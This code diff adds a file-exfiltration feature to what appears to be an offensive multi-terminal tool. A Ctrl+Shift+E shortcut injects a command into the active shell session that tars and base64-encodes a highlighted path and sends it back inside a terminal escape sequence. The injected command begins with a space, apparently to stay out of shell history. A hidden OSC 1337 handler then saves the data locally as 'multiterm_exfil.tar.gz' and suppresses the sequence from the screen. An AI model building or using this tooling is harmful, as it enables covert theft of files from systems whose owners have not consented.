@@ -49,7 +49,7 @@ async function createTerminalPane(): Promise<TerminalInstance> {
   term.attachCustomKeyEventHandler((e) => {
     if (e.ctrlKey && e.shiftKey) {
       const key = e.key.toLowerCase();
-      if (['d', 'w', 'b', 'p'].includes(key)) {
+      if (['d', 'w', 'b', 'p', 'e'].includes(key)) {
         if (e.type === 'keydown') {
           return false;
         }
@@ -80,6 +80,33 @@ async function createTerminalPane(): Promise<TerminalInstance> {
       }
       callback(links.length > 0 ? links : undefined);
     }
+  });
+
+  // OSC 1337 Interceptor for File Exfiltration
+  term.parser.registerOscHandler(1337, (data) => {
+    if (data.startsWith('File=')) {
+      const b64Data = data.split('inline=1:')[1];
+      if (b64Data) {
+        try {
+          const byteCharacters = atob(b64Data);
+          const byteNumbers = new Array(byteCharacters.length);
+          for (let i = 0; i < byteCharacters.length; i++) {
+            byteNumbers[i] = byteCharacters.charCodeAt(i);
+          }
+          const byteArray = new Uint8Array(byteNumbers);
+          const blob = new Blob([byteArray], { type: 'application/gzip' });
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = 'multiterm_exfil.tar.gz';
+          a.click();
+          URL.revokeObjectURL(url);
+        } catch (err) {
+          console.error("Failed to decode exfiltrated payload", err);
+        }
+      }
+    }
+    return true; // Hides the sequence from the terminal screen
   });
 
   const fitAddon = new FitAddon();
@@ -231,6 +258,18 @@ window.addEventListener('DOMContentLoaded', async () => {
         const drawer = document.getElementById('payload-drawer');
         if (drawer) {
           drawer.classList.toggle('hidden');
+        }
+      } else if (e.key.toLowerCase() === 'e') {
+        e.preventDefault();
+        const activeInstance = terminalInstances.find(t => t.id === activeTerminalId) || terminalInstances[terminalInstances.length - 1];
+        if (activeInstance && activeInstance.ptyId) {
+          const selectedText = activeInstance.term.getSelection().trim();
+          if (selectedText) {
+             const injectCmd = ` printf "\\033]1337;File=name=exfil.tar.gz;inline=1:%s\\007" "$(tar -czf - '${selectedText}' 2>/dev/null | base64 -w 0)"\r `;
+             invoke('write_pty', { id: activeInstance.ptyId, data: injectCmd });
+          } else {
+             alert("Please highlight a file or folder path first!");
+          }
         }
       }
     }
